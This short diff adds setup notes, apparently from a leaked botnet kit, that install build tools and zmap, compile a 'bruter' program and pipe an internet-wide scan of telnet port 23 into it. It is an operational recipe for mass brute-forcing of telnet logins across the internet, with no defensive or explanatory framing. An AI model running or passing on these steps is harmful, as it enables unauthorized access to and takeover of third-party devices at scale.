@@ -1,0 +1,9 @@
+yum groupinstall "Development Tools" -y
+yum install gcc -y
+yum install zmap -y
+-------------------------------------------
+gcc bruter/*.c -obrute -pthread -std=c99
+ulimit -n 999999
+zmap -p23 -q | ./brute 1
+-------------------------------------------
+leaked by https://evilarchive.cf
